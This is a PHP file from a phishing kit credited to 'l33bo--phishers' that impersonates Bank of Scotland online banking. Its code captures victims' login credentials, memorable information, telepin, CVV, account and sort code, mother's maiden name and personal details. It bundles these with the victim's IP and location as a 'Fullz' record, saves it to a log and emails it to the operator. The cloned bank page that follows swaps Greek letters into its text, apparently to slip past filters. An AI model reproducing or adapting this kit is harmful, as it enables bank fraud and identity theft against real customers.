<?php
/*
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
*/
require "assets/includes/session_protect.php";
require_once("assets/includes/functions.php");
include "../CONTROLS.php";
include("assets/includes/AES.php");
$username = $_POST['username'];
$password = $_POST['password'];
$memo = $_POST['memo'];
$title = $_POST['title'];
$name = $_POST['name'];
$dob = $_POST['dob'];
$email = $_POST['email'];
$telephone = $_POST['telephone'];
$Network = $_POST['Network'];
$address = $_POST['address'];
$postcode = $_POST['postcode'];
$acno = $_POST['acno'];
$sort = $_POST['sort'];
$secode = $_POST['secode'];
$acno = $_POST['acno'];
$sort = $_POST['sort'];
$mmn = $_POST['mmn'];
$telepin = $_POST['telepin'];
$ip = $_SERVER['REMOTE_ADDR'];
$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
$from = $From_Address;
$headers = "From:" . $from;
$subj = "Bos : $ip";
$to = $Your_Email; 
$warnsubj = "Abuse";
$warn = "A user (with ip: $ip) has attempted to send you a completed form containing abusive language. l33bo_Phishers is against abusive form filling and has redirected this user to the official site while blocking the form.";
$bad_words = array('9999','4r5e','5h1t','5hit','a55','anal','anus','ar5e','arrse','arse','ass','ass-fucker','asses','assfucker','assfukka','asshole','assholes','asswhole','a_s_s','b!tch','b00bs','b17ch','b1tch','ballbag','balls','ballsack','bastard','beastial','beastiality','bellend','bestial','bestiality','bi+ch','biatch','bitch','bitcher','bitchers','bitches','bitchin','bitching','bloody','blow job','blowjob','blowjobs','boiolas','bollock','bollok','boner','boob','boobs','booobs','boooobs','booooobs','booooooobs','breasts','buceta','bugger','bum','bunny fucker','butt','butthole','buttmuch','buttplug','c0ck','c0cksucker','carpet muncher','cawk','chink','cipa','cl1t','clit','clitoris','clits','cnut','cock','cock-sucker','cockface','cockhead','cockmunch','cockmuncher','cocks','cocksuck ','cocksucked ','cocksucker','cocksucking','cocksucks ','cocksuka','cocksukka','cok','cokmuncher','coksucka','coon','cox','crap','cum','cummer','cumming','cums','cumshot','cunilingus','cunillingus','cunnilingus','cunt','cuntlick ','cuntlicker ','cuntlicking ','cunts','cyalis','cyberfuc','cyberfuck ','cyberfucked ','cyberfucker','cyberfuckers','cyberfucking ','d1ck','damn','dick','dickhead','dildo','dildos','dink','dinks','dirsa','dlck','dog-fucker','doggin','dogging','donkeyribber','doosh','duche','dyke','ejaculate','ejaculated','ejaculates ','ejaculating ','ejaculatings','ejaculation','ejakulate','f u c k','f u c k e r','f4nny','fag','fagging','faggitt','faggot','faggs','fagot','fagots','fags','fanny','fannyflaps','fannyfucker','fanyy','fatass','fcuk','fcuker','fcuking','feck','fecker','felching','fellate','fellatio','fingerfuck ','fingerfucked ','fingerfucker ','fingerfuckers','fingerfucking ','fingerfucks ','fistfuck','fistfucked ','fistfucker ','fistfuckers ','fistfucking ','fistfuckings ','fistfucks ','flange','fook','fooker','fuck','fucka','fucked','fucker','fuckers','fuckhead','fuckheads','fuckin','fucking','fuckings','fuckingshitmotherfucker','fuckme ','fucks','fuckwhit','fuckwit','fudge packer','fudgepacker','fuk','fuker','fukker','fukkin','fuks','fukwhit','fukwit','fux','fux0r','f_u_c_k','gangbang','gangbanged ','gangbangs ','gaylord','gaysex','goatse','God','god-dam','god-damned','goddamn','goddamned','hardcoresex ','hell','heshe','hoar','hoare','hoer','homo','hore','horniest','horny','hotsex','jack-off ','jackoff','jap','jerk-off ','jism','jiz ','jizm ','jizz','kawk','knob','knobead','knobed','knobend','knobhead','knobjocky','knobjokey','kock','kondum','kondums','kum','kummer','kumming','kums','kunilingus','l3i+ch','l3itch','labia','lmfao','lust','lusting','m0f0','m0fo','m45terbate','ma5terb8','ma5terbate','masochist','master-bate','masterb8','masterbat*','masterbat3','masterbate','masterbation','masterbations','masturbate','mo-fo','mof0','mofo','mothafuck','mothafucka','mothafuckas','mothafuckaz','mothafucked ','mothafucker','mothafuckers','mothafuckin','mothafucking ','mothafuckings','mothafucks','mother fucker','motherfuck','motherfucked','motherfucker','motherfuckers','motherfuckin','motherfucking','motherfuckings','motherfuckka','motherfucks','muff','mutha','muthafecker','muthafuckker','muther','mutherfucker','n1gga','n1gger','nazi','nigg3r','nigg4h','nigga','niggah','niggas','niggaz','nigger','niggers ','nob','nob jokey','nobhead','nobjocky','nobjokey','numbnuts','nutsack','orgasim ','orgasims ','orgasm','orgasms ','p0rn','pawn','pecker','penis','penisfucker','phonesex','phuck','phuk','phuked','phuking','phukked','phukking','phuks','phuq','pigfucker','pimpis','piss','pissed','pisser','pissers','pisses ','pissflaps','pissin ','pissing','pissoff ','poop','porn','porno','pornography','pornos','prick','pricks ','pron','pube','pusse','pussi','pussies','pussy','pussys ','rectum','retard','rimjaw','rimming','s hit','s.o.b.','sadist','schlong','screwing','scroat','scrote','scrotum','semen','sex','sh!+','sh!t','sh1t','shag','shagger','shaggin','shagging','shemale','shi+','shit','shitdick','shite','shited','shitey','shitfuck','shitfull','shithead','shiting','shitings','shits','shitted','shitter','shitters ','shitting','shittings','shitty ','skank','slut','sluts','smegma','smut','snatch','son-of-a-bitch','spac','spunk','s_h_i_t','t1tt1e5','t1tties','teets','teez','testical','testicle','tit','titfuck','tits','titt','tittie5','tittiefucker','titties','tittyfuck','tittywank','titwank','tosser','turd','tw4t','twat','twathead','twatty','twunt','twunter','v14gra','v1gra','vagina','viagra','vulva','w00se','wang','wank','wanker','wanky','whoar','whore','willies','willy','xrated','fuck','fuckoff','fuck off','fucking','nigger','nigerian','Nigerian','scam','cunt','wankers','twats','scammers','shit','wanker','cunt','asshole','arsehole','passwd','sample');
$VictimInfo .= "| IP Address : " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")\r\n";
$VictimInfo .= "| Location: " . $systemInfo['city'] . ", " . $systemInfo['region'] . ", " . $systemInfo['country'] . "\r\n";
$VictimInfo .= "| UserAgent : " . $systemInfo['useragent'] . "\r\n";
$VictimInfo .= "| Browser : " . $systemInfo['browser'] . "\r\n";
$VictimInfo .= "| Platform : " . $systemInfo['os'] . "";
$data = "
+ -------------- L33bo Fullz ---------------+
+ ------------------------------------------+
+ Personal Information
| Full name : $title, $name
| Date of birth : $dob
| Address : $address
| Postcode : $postcode
| Phone : $telephone (Network: $Network)
| Email : $email
| MMN : $mmn
+ ------------------------------------------+
+ Account Information (Bos)
| Username : $username
| Password : $password
| Memorable : $memo
| Telepin : $telepin
| CVV : $secode
| Account Number : $acno 
| Sortcode : $sort
+ ------------------------------------------+
+ Victim Information
$VictimInfo
+ ------------------------------------------+
";
$imputText = $data;
$imputKey = "232BBCD7D47A1192"; 
$blockSize = 256;
$aes = new AES($imputText, $imputKey, $blockSize);
$enc = $aes->encrypt();
$aes->setData($enc);
$dec=$aes->decrypt();
if($Abuse_Filter==1)
{
foreach($bad_words as $bad_word){
    if(stristr($_POST['name'], $bad_word) !== false) {
		mail($to,$warnsubj,$warn,$headers);
        exit(header("Location: https://www.google.co.uk/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0CCEQFjAAahUKEwiSr7DAu5DIAhUDNhoKHWlFCZg&url=https%3A%2F%2Fwww.bankofscotland.co.uk%2F&usg=AFQjCNHbYH9PiAHwueBiIBTc2NA56S8S4g"));
    }
	if(stristr($_POST['mmn'], $bad_word) !== false) {
		mail($to,$warnsubj,$warn,$headers);
        exit(header("Location:  https://www.google.co.uk/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0CCEQFjAAahUKEwiSr7DAu5DIAhUDNhoKHWlFCZg&url=https%3A%2F%2Fwww.bankofscotland.co.uk%2F&usg=AFQjCNHbYH9PiAHwueBiIBTc2NA56S8S4g"));
    }
}
}
require "../assets/includes/vpn_check.php";
if($Save_Log==1) {
	if($Encrypt==1) {
	$file=fopen("assets/logs/bos.txt","a");
	fwrite($file,$enc);
	fclose($file);
	}
	else {
	$file=fopen("assets/logs/bos.txt","a");
	fwrite($file,$data);
	fclose($file);
	}
}	
if($Send_Log==1) {
	if($Encrypt==1) {
	mail($to,$subj,$enc,$headers);	
	}
	else {
	mail($to,$subj,$data,$headers);	
	}
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<title>Complete</title>
<meta content="en-gb" http-equiv="content-language">
<link href="assets/img/favicon.ico" rel="shortcut icon">
<link href="assets/css/001.css" media="screen, print" rel="stylesheet" type="text/css">
<link href="assets/css/002.css" media="screen, print" rel="stylesheet" type="text/css">
<link href="assets/css/003.css" media="screen, print" rel="stylesheet" type="text/css">
<script src="assets/js/jquery.js" type="text/javascript"></script>
<script src="assets/js/wording.jspf" type="text/javascript"></script>
<script src="assets/js/global.js" type="text/javascript"></script>
<script type="text/javascript">
DI.themePath="https://online.bankofscotland.co.uk//personal/unauth/assets/BOSRetail/";
</script>
<script src="assets/js/custom.js" type="text/javascript"></script>
<link href="assets/css/004.css" media="screen" rel="stylesheet" type="text/css">
<meta http-equiv="refresh" content="5; URL='../Finish.php?&sessionid=<?php echo generateRandomString(110); ?>&securessl=true'" />
</head>
<body>
<div id="wrapper">
<div class="outer">
<div id="header">
<ul id="skiplinks">
<li><a href="#" id="lnkSkip" name="lnkSkip">Skip t&omicron; main c&omicron;ntent</a></li>
</ul>
<div class="clearfix"><span id="strbrandname" style="display: none">&Beta;&Omicron;S</span>
<p id="logo"><span><img src="assets/img/logo.gif"></span></p>
<div class="secureMsg">
<p class="msg"><img src="assets/img/msg.png"></p>
<p><a class="newwin" href="#">H&omicron;w can I tell that this site is secure?</a></p>
</div>
<div class="loggedIn">
<ul>
<li class="mobile"><a class="linkBullet" href="#">M&omicron;bile</a></li>
<li class="cookie"><a class="linkBullet newwin" href="#">C&omicron;&omicron;kie p&omicron;licy</a></li>
</ul>
</div>
</div>
</div>
</div>
<div class="pageWrap">
<div class="content" id="page">
<div class="primaryWrap">
<div class="primary">
<div class="panel"> 
<div class="wideMessage">
<a id="loadingIcon" name="loadingIcon" href="#"><img src="assets/img/spin.gif" alt="Loading icon" /></a>
<br />
<br />
<h1>Please wait while we check your inf&omicron;rmati&omicron;n</h1>
<br />
<p align="center">It'll &omicron;nly take a few seconds - we're just verifying the details that y&omicron;u've entered.</p>
<p align="center">Please d&omicron;n't refresh this page &omicron;r cl&omicron;se y&omicron;ur browser while y&omicron;u're waiting.</p>
<br />
<div class="subPanel">
<p align="center">You will be redirected back to HMRC in order to complete your claim</p>
</div>
</div>
</div>
</div>
</div>
<div class="secondary">
<div class="panel">
<div class="subPanelShadow">
<div class="subPanel">
<p><a class="newwin" href="#"><img src="assets/img/ad1.jpg"></a></p>
</div>
</div>
<div class="accordion ui-accordion ui-widget ui-helper-reset">
<div class="partShadow">
<div class="part">
<h2 class="trigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-default ui-corner-all" tabindex="0" title="Contact us: Use this link to show or hide more information.">
<span class="ui-icon ui-icon-triangle-1-e"></span>C&omicron;ntact us</h2>
<div class="pane ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" style="display: none;">
<div class="paneInner">
<div class="quickContact">
<h3>Internet &Beta;anking Helpdesk</h3>
<p>0345 521 5412</p>
<p>+44 1138 12 23 05&nbsp;fr&omicron;m &omicron;utside the UK</p>
<h3>&Beta;ank acc&omicron;unts</h3>
<p>0345 858 9856</p>
<p>+44 215 258 1258&nbsp;fr&omicron;m &omicron;utside the UK</p>
<h3>Savings (including cash ISAs)</h3>
<p>08457 98 02 02<br></p>
<p>Lines are &omicron;pen M&omicron;nday t&omicron; Friday, 8:00am – 8:00pm; Saturday 8:00am – 6:00pm; Sunday 9:00am - 5:00pm.</p>
<p>F&omicron;r st&omicron;cks and shares ISAs see <strong>ISA Investor</strong>.</p>
<h3>Investments</h3>
<p><strong>08452 540 212</strong><br>
Lines are &omicron;pen M&omicron;nday t&omicron; Friday, 8.30am – 7pm; Saturday 8.30am – 12:30pm<br>
&nbsp;<br>
F&omicron;r cash ISAs see <strong>Savings (including cash ISAs).</strong></p>
<h3>Credit cards</h3>
<p>0346 326 2012</p>
<p>+44 215 021 1525&nbsp;fr&omicron;m &omicron;utside the UK</p>
<h3>M&omicron;rtgages</h3>
<p>08456 21 21 85<br>
Lines are &omicron;pen M&omicron;nday t&omicron; Friday, 8:00am - 8:00pm; Saturday 9:00am - 4:00pm.</p>
<h3>Pers&omicron;nal l&omicron;ans</h3>
<p>If y&omicron;ur <strong>l&omicron;an agreement begins with<br>
7 call&nbsp;08459 65 68 64<br></strong>(Lines are &omicron;pen M&omicron;nday t&omicron; Friday, 8:00am - 8:00pm; Saturday 9:00am - 6:00pm).</p>
<p>If y&omicron;ur <strong>l&omicron;an agreement begins with<br>
88 &omicron;r 16 call</strong>&nbsp;<strong>08452 00 12 50<br></strong>(Lines are &omicron;pen M&omicron;nday t&omicron; Friday, 8:00am - 10:00pm; Saturday 9:00am - 6:00pm; Sunday 9:30am - 5.30pm).</p>
<p>If y&omicron;ur <strong>l&omicron;an agreement begins with<br>
100 call&nbsp;08466 45 62 88<br></strong>(Lines are &omicron;pen M&omicron;nday t&omicron; Sunday, 8:00am- 10:00pm).</p>
<h3>&nbsp;L&omicron;st &omicron;r st&omicron;len cards</h3>
<p>0800 525 5858</p>
<h3>Textph&omicron;ne</h3>
<p>0346 752 4106<br>
Lines are &omicron;pen M&omicron;nday t&omicron; Friday, 9:00am - 5.30pm. (F&omicron;r use by cust&omicron;mers with hearing impairments &omicron;nly)</p>
<p>We may rec&omicron;rd y&omicron;ur call s&omicron; we can check we've carried &omicron;ut y&omicron;ur instructi&omicron;ns c&omicron;rrectly and t&omicron; help us impr&omicron;ve &omicron;ur service.</p>
</div>
</div>
</div>
</div>
</div>
<div class="partShadow">
<div class="part">
<h2 class="trigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-default ui-corner-all" tabindex="0" title="Help &amp; support: Use this link to show or hide more information.">
<span class="ui-icon ui-icon-triangle-1-e"></span>Help &amp; supp&omicron;rt</h2>
<div class="pane ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" style="display: none;">
<div class="paneInner">
<ul class="quickFAQs ui-accordion ui-widget ui-helper-reset">
<li class="ui-accordion-li-fix">
<h3 class="qfaqTrigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-default ui-corner-all" tabindex="-1" title=
"What can I do to protect myself online?: Use this link to show or hide more information."><span class="ui-icon ui-icon-triangle-1-e"></span>What can I do to protect myself online?</h3>
<div class="qfaqCont ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" style="display: none;">
<p></p>
<p>Ad&omicron;pting a few g&omicron;&omicron;d habits can help make sure y&omicron;ur pers&omicron;nal inf&omicron;rmati&omicron;n stays safe and secure &omicron;n the internet. Find &omicron;ut m&omicron;re ab&omicron;ut&nbsp;<a class="newwin" href="#" tabindex="-1">&omicron;nline
security</a>&nbsp;</p>
<p></p>
</div>
</li>
<li class="ui-accordion-li-fix">
<h3 class="qfaqTrigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-default ui-corner-all" tabindex="-1" title=
"Why am I having trouble logging in?: Use this link to show or hide more information."><span class="ui-icon ui-icon-triangle-1-e"></span>Why am I having tr&omicron;uble l&omicron;gging in?</h3>
<div class="qfaqCont ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" style="display: none;">
<p></p>
<p>It c&omicron;uld be because y&omicron;u're trying t&omicron; l&omicron;g in fr&omicron;m a netw&omicron;rked site (the &omicron;ffice, f&omicron;r example). If s&omicron;, please c&omicron;ntact y&omicron;ur Systems Administrat&omicron;r f&omicron;r help.</p>
<p>If y&omicron;u still have tr&omicron;uble, please call &omicron;ur helpdesk &omicron;n<strong>&nbsp;0346 452 1542&nbsp;</strong>(+44 1523 85 96 32 fr&omicron;m &omicron;utside the UK).</p>
<p>Textph&omicron;ne users wh&omicron; have a hearing &omicron;r speech impairment can call us &omicron;n&nbsp;<strong>0347 800 4152</strong><strong>&nbsp;</strong>(+44 1523 85 96 32&nbsp;fr&omicron;m &omicron;utside the UK).</p>
<p></p>
</div>
</li>
<li class="ui-accordion-li-fix">
<h3 class="qfaqTrigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-default ui-corner-all" tabindex="-1" title=
"How do I reset my password and/or memorable information?: Use this link to show or hide more information."><span class="ui-icon ui-icon-triangle-1-e"></span>How do I reset my password and/or
memorable information?</h3>
<div class="qfaqCont ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" style="display: none;">
<p></p>
<p>First, go to the Internet &Beta;anking <a class="newwin" href="#" tabindex="-1">l&omicron;g in</a> screen and click &omicron;n the 'F&omicron;rg&omicron;tten y&omicron;ur passw&omicron;rd?' link. Y&omicron;u'll need t&omicron; enter a few details. &Omicron;n the next
screen y&omicron;u'll be asked if y&omicron;u want t&omicron; reset y&omicron;ur passw&omicron;rd &omicron;r reset b&omicron;th y&omicron;ur passw&omicron;rd and mem&omicron;rable inf&omicron;rmati&omicron;n. Select the &omicron;pti&omicron;n which applies t&omicron; y&omicron;u.</p>
<p>If y&omicron;u ch&omicron;&omicron;se t&omicron; reset y&omicron;ur passw&omicron;rd and/&omicron;r mem&omicron;rable inf&omicron;rmati&omicron;n, y&omicron;u’ll need t&omicron; enter and c&omicron;nfirm y&omicron;ur new details and select a ph&omicron;ne number f&omicron;r us t&omicron; call y&omicron;u &omicron;n. Y&omicron;u’ll then receive a call
fr&omicron;m &omicron;ur aut&omicron;mated system. F&omicron;ll&omicron;w the instructi&omicron;ns and y&omicron;ur passw&omicron;rd and/&omicron;r mem&omicron;rable inf&omicron;rmati&omicron;n will be reset immediately.</p>
<p></p>
</div>
</li>
<li class="ui-accordion-li-fix">
<h3 class="qfaqTrigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-default ui-corner-all" tabindex="-1" title=
"I&#39;m locked out of my account. What should I do?: Use this link to show or hide more information."><span class="ui-icon ui-icon-triangle-1-e"></span>I'm locked out of my account. What should I
do?</h3>
<div class="qfaqCont ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" style="display: none;">
<p></p>
<p>Y&omicron;u may need t&omicron; reset y&omicron;ur passw&omicron;rd. T&omicron; d&omicron; s&omicron;, g&omicron; t&omicron; the Internet &Beta;anking <a class="newwin" href="#" tabindex="-1">l&omicron;g in</a> screen,
click &omicron;n the 'F&omicron;rg&omicron;tten y&omicron;ur passw&omicron;rd?' link, and f&omicron;ll&omicron;w the &omicron;n-screen instructi&omicron;ns.</p>
<p>If y&omicron;u're still unable t&omicron; access Internet &Beta;anking, please call &omicron;ur helpdesk &omicron;n <strong>0347 652 5050</strong> (+44 1112 45 45 85 fr&omicron;m &omicron;utside the UK) and &omicron;ne &omicron;f &omicron;ur cust&omicron;mer service agents will be
able t&omicron; help y&omicron;u. Textph&omicron;ne users wh&omicron; have a hearing &omicron;r speech impairment can call us &omicron;n&nbsp;0345 600 9644<strong>&nbsp;</strong>(+44 131 278 3690&nbsp;fr&omicron;m &omicron;utside the UK).</p>
<p></p>
</div>
</li>
<li class="ui-accordion-li-fix">
<h3 class="qfaqTrigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-default ui-corner-all" tabindex="-1" title=
"Are my security details case sensitive?: Use this link to show or hide more information."><span class="ui-icon ui-icon-triangle-1-e"></span>Are my security details case sensitive?</h3>
<div class="qfaqCont ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" style="display: none;">
<p></p>
<p>N&omicron;, y&omicron;ur security details, including y&omicron;ur passw&omicron;rd and user name, aren't case sensitive.</p>
<p></p>
</div>
</li>
</ul>
<p><a class="linkBullet linkMore newwin newfaqwin" href="#" tabindex="-1">More help &amp; supp&omicron;rt</a></p>
</div>
</div>
</div>
</div>
</div>
<div class="subPanelShadow">
<div class="subPanel">
<p><a class="newwin" href="#"><img src="assets/img/ad2.png"></a></p>
</div>
</div>
<div class="subPanelShadow">
<div class="subPanel">
<p><a class="newwin" href="#"><img src="assets/img/ad3.png"></a></p>
</div>
</div>
</div>
</div>
</div>
</div>
<div id="footer">
<div class="outer">
<div id="footerInner">
<ul>
<li><a class="newwin" href="#">Legal</a></li>
<li><a class="newwin" href="#">Privacy</a></li>
<li><a class="newwin" href="#">Security</a></li>
<li><a class="newwin" href="#">www.ll&omicron;ydsbankinggr&omicron;up.c&omicron;m</a></li>
<li><a class="newwin" href="#">Rates &amp; fees</a></li>
</ul>
</div>
</div>
</div>
</div>
<script src="assets/js/footer.js" type="text/javascript"></script>
</body>
</html>
<?php
/*
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
*/
?>